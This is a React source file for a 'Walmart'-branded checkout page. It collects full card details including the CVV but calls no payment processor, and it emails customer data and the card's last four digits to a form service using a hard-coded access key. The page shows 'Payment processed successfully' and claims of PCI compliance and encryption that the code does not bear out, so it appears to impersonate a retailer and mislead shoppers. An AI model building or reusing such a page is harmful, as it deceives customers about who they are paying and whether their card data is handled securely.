import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent, CardHeader, CardTitle } from '../components/ui/card';
import { ArrowLeft, Lock, CreditCard, ShieldCheck, RefreshCcw } from 'lucide-react';
import { toast } from 'sonner';

const PaymentPage = () => {
  const navigate = useNavigate();
  const [isProcessing, setIsProcessing] = useState(false);
  const [paymentData, setPaymentData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardholderName: ''
  });

  const handleChange = (e) => {
    let value = e.target.value;
    const name = e.target.name;

    // Format card number
    if (name === 'cardNumber') {
      value = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      if (value.length > 19) return;
    }

    // Format expiry date
    if (name === 'expiryDate') {
      value = value.replace(/\D/g, '');
      if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2, 4);
      }
      if (value.length > 5) return;
    }

    // Format CVV
    if (name === 'cvv') {
      value = value.replace(/\D/g, '');
      if (value.length > 4) return;
    }

    setPaymentData({
      ...paymentData,
      [name]: value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validation
    if (!paymentData.cardNumber || !paymentData.expiryDate || !paymentData.cvv || !paymentData.cardholderName) {
      toast.error('Please fill in all payment details');
      return;
    }

    // Card number validation (at least 13 digits)
    const cardDigits = paymentData.cardNumber.replace(/\s/g, '');
    if (cardDigits.length < 13) {
      toast.error('Please enter a valid card number');
      return;
    }

    // CVV validation
    if (paymentData.cvv.length < 3) {
      toast.error('Please enter a valid CVV');
      return;
    }

    setIsProcessing(true);

    try {
      // Get cart and user info
      const cart = JSON.parse(localStorage.getItem('cart')) || [];
      const userInfo = JSON.parse(localStorage.getItem('userInfo')) || {};

      const subtotal = cart.reduce(
        (sum, item) => sum + item.discountedPrice * item.quantity,
        0
      );

      // Save order to database
      const orderData = {
        customerName: userInfo.fullName,
        customerEmail: userInfo.email,
        customerPhone: userInfo.phone,
        shippingAddress: userInfo.address,
        city: userInfo.city,
        state: userInfo.state,
        zipCode: userInfo.zipCode,
        country: userInfo.country,
        items: cart.map(item => ({
          id: item.id,
          name: item.name,
          price: item.discountedPrice,
          quantity: item.quantity
        })),
        total: subtotal
      };

      // Save to MongoDB
      const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
      const dbResponse = await fetch(`${BACKEND_URL}/api/orders`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(orderData)
      });

      if (!dbResponse.ok) {
        throw new Error('Failed to save order to database');
      }

      // Prepare email notification data
      const emailData = {
        access_key: '7d02f2c8-8ae8-4c8d-bfd3-aab848bf2ee8',
        subject: 'New Order Received - Walmart Store',
        from_name: 'Walmart E-commerce',
        // Customer Information
        customer_name: userInfo.fullName,
        customer_email: userInfo.email,
        customer_phone: userInfo.phone,
        // Shipping Address
        shipping_address: userInfo.address,
        shipping_city: userInfo.city,
        shipping_state: userInfo.state,
        shipping_zip: userInfo.zipCode,
        shipping_country: userInfo.country,
        // Payment Information (masked)
        card_last_4: cardDigits.slice(-4),
        card_holder: paymentData.cardholderName,
        // Order Details
        order_total: subtotal.toFixed(2),
        order_items: cart.map(item => 
          `${item.name} - Qty: ${item.quantity} - $${(item.discountedPrice * item.quantity).toFixed(2)}`
        ).join('\n'),
        // Additional Info
        order_date: new Date().toLocaleString(),
        redirect: false
      };

      // Send to Web3Forms
      const response = await fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Accept: 'application/json'
        },
        body: JSON.stringify(emailData)
      });

      const result = await response.json();

      if (result.success) {
        // Save order info and clear cart
        localStorage.setItem('lastOrder', JSON.stringify({
          cart,
          userInfo,
          total: subtotal,
          orderDate: new Date().toISOString()
        }));
        localStorage.removeItem('cart');
        localStorage.removeItem('userInfo');

        toast.success('Payment processed successfully!');
        setTimeout(() => {
          navigate('/checkout/confirmation');
        }, 1000);
      } else {
        throw new Error('Failed to send order notification');
      }
    } catch (error) {
      console.error('Payment error:', error);
      toast.error('There was an issue processing your order. Please try again.');
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="bg-[#0071CE] text-white py-4 shadow-md">
        <div className="container mx-auto px-4">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              className="text-white hover:bg-[#004F9A]"
              onClick={() => navigate('/checkout/user-info')}
              disabled={isProcessing}
            >
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <img 
                src="https://w7.pngwing.com/pngs/45/625/png-transparent-yellow-logo-illustration-walmart-logo-grocery-store-retail-asda-stores-limited-icon-walmart-logo-miscellaneous-company-orange.png"
                alt="Walmart Logo"
                className="h-8 w-8 object-contain"
              />
              <h1 className="text-2xl font-bold">Secure Payment</h1>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-8 max-w-2xl">
        {/* Security Badges */}
        <div className="grid grid-cols-3 gap-4 mb-8">
          <Card className="text-center p-4">
            <Lock className="h-8 w-8 text-green-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">SSL Encrypted</p>
          </Card>
          <Card className="text-center p-4">
            <ShieldCheck className="h-8 w-8 text-blue-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">Secure Payment</p>
          </Card>
          <Card className="text-center p-4">
            <RefreshCcw className="h-8 w-8 text-purple-600 mx-auto mb-2" />
            <p className="text-xs font-semibold">Money Back</p>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5" />
              Payment Information
            </CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Cardholder Name */}
              <div className="space-y-2">
                <Label htmlFor="cardholderName">Cardholder Name *</Label>
                <Input
                  id="cardholderName"
                  name="cardholderName"
                  type="text"
                  value={paymentData.cardholderName}
                  onChange={handleChange}
                  placeholder="John Doe"
                  required
                  disabled={isProcessing}
                />
              </div>

              {/* Card Number */}
              <div className="space-y-2">
                <Label htmlFor="cardNumber">Card Number *</Label>
                <Input
                  id="cardNumber"
                  name="cardNumber"
                  type="text"
                  value={paymentData.cardNumber}
                  onChange={handleChange}
                  placeholder="1234 5678 9012 3456"
                  required
                  disabled={isProcessing}
                />
              </div>

              {/* Expiry and CVV */}
              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="expiryDate">Expiry Date *</Label>
                  <Input
                    id="expiryDate"
                    name="expiryDate"
                    type="text"
                    value={paymentData.expiryDate}
                    onChange={handleChange}
                    placeholder="MM/YY"
                    required
                    disabled={isProcessing}
                  />
                </div>
                <div className="space-y-2">
                  <Label htmlFor="cvv">CVV *</Label>
                  <Input
                    id="cvv"
                    name="cvv"
                    type="text"
                    value={paymentData.cvv}
                    onChange={handleChange}
                    placeholder="123"
                    required
                    disabled={isProcessing}
                  />
                </div>
              </div>

              {/* Security Notice */}
              <div className="bg-green-50 border border-green-200 rounded-lg p-4">
                <div className="flex items-start gap-3">
                  <Lock className="h-5 w-5 text-green-600 mt-0.5" />
                  <div>
                    <p className="text-sm font-semibold text-green-900 mb-1">
                      Your payment is secure
                    </p>
                    <p className="text-xs text-green-700">
                      We use industry-standard encryption to protect your card
                      details. Your information is never stored on our servers.
                    </p>
                  </div>
                </div>
              </div>

              <Button
                type="submit"
                className="w-full bg-[#0071CE] hover:bg-[#004F9A] text-white font-semibold py-6 text-lg"
                disabled={isProcessing}
              >
                {isProcessing ? (
                  <>
                    <span className="animate-spin mr-2">⏳</span>
                    Processing Payment...
                  </>
                ) : (
                  'Pay Now'
                )}
              </Button>

              <p className="text-xs text-center text-gray-500">
                By clicking "Pay Now", you agree to our terms and conditions
              </p>
            </form>
          </CardContent>
        </Card>

        {/* Trust Badges */}
        <div className="mt-6 text-center">
          <p className="text-sm text-gray-600 mb-3">
            Trusted by millions of customers worldwide
          </p>
          <div className="flex justify-center gap-4 text-gray-400">
            <div className="text-xs">🔒 256-bit SSL</div>
            <div className="text-xs">✓ PCI Compliant</div>
            <div className="text-xs">✓ Secure Checkout</div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentPage;
